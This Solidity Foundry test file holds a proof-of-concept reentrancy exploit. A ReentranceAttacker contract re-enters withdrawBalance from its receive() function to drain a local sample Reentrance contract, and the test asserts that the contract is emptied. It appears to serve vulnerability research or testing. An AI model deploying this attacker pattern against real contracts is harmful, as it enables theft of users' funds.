// SPDX-License-Identifier: MIT
pragma solidity 0.8.26;
pragma experimental ABIEncoderV2;

import "forge-std/Test.sol";
import "../src/reentrancy_simple.sol";

contract ReentranceAttacker {
    Reentrance public target;
    uint private reentrancyDepth;

    constructor(Reentrance _target) {
        target = _target;
    }

    function attack() external {
        reentrancyDepth = 0;
        target.withdrawBalance();
    }

    receive() external payable {
        if (reentrancyDepth < 1 && address(target).balance >= msg.value) {
            reentrancyDepth++;
            target.withdrawBalance();
        }
    }
}

contract ReentranceTest is Test {
    Reentrance public reentrance;
    address public testUser = address(0x123);
    ReentranceAttacker public attacker;

    function setUp() public {
        reentrance = new Reentrance();
        attacker = new ReentranceAttacker(reentrance);

        // Setup test user deposit (1 ether)
        vm.deal(testUser, 1 ether);
        vm.prank(testUser);
        reentrance.addToBalance{value: 1 ether}();

        // Setup attacker deposit (1 ether)
        vm.deal(address(attacker), 1 ether);
        vm.prank(address(attacker));
        reentrance.addToBalance{value: 1 ether}();
    }

    function testReentrancyVulnerability() public {
        console2.log("--- BEFORE-Trigger State ---");
        uint contractEthBalancePre = address(reentrance).balance;
        uint attackerEthBalancePre = address(attacker).balance;
        uint attackerInternalBalancePre = reentrance.getBalance(address(attacker));
        uint totalWithdrawalsPre = reentrance.totalWithdrawals();
        
        console2.log("Contract ETH Balance (pre):", contractEthBalancePre);
        console2.log("Attacker ETH Balance (pre):", attackerEthBalancePre);
        console2.log("Attacker Internal Balance (pre):", attackerInternalBalancePre);
        console2.log("Total Withdrawals (pre):", totalWithdrawalsPre);

        console2.log("--- Trigger Attack ---");
        attacker.attack();

        console2.log("--- AFTER-Trigger State ---");
        uint contractEthBalancePost = address(reentrance).balance;
        uint attackerEthBalancePost = address(attacker).balance;
        uint attackerInternalBalancePost = reentrance.getBalance(address(attacker));
        uint totalWithdrawalsPost = reentrance.totalWithdrawals();
        
        console2.log("Contract ETH Balance (post):", contractEthBalancePost);
        console2.log("Attacker ETH Balance (post):", attackerEthBalancePost);
        console2.log("Attacker Internal Balance (post):", attackerInternalBalancePost);
        console2.log("Total Withdrawals (post):", totalWithdrawalsPost);

        // Validate state changes
        bool contractDrained = contractEthBalancePost == 0;
        bool attackerGained = (attackerEthBalancePost - attackerEthBalancePre) == 2 ether;
        bool internalBalanceZeroed = attackerInternalBalancePost == 0;
        bool withdrawalsIncreased = (totalWithdrawalsPost - totalWithdrawalsPre) == 2 ether;
        
        console2.log("--- Verification ---");
        console2.log("Contract fully drained:", contractDrained);
        console2.log("Attacker gained 2 ether:", attackerGained);
        console2.log("Attacker internal balance zeroed:", internalBalanceZeroed);
        console2.log("Total withdrawals increased by 2 ether:", withdrawalsIncreased);

        if (contractDrained && attackerGained && internalBalanceZeroed && withdrawalsIncreased) {
            console2.log("Vulnerability Exists: reentrancy attack drained contract balance");
        } else {
            console2.log("Vulnerability not Exist: reentrancy attack failed");
        }

        // Preserve original validation (optional)
        assertEq(contractEthBalancePre, 2 ether);
        assertEq(contractEthBalancePost, 0);
        assertEq(attackerEthBalancePost - attackerEthBalancePre, 2 ether);
    }
}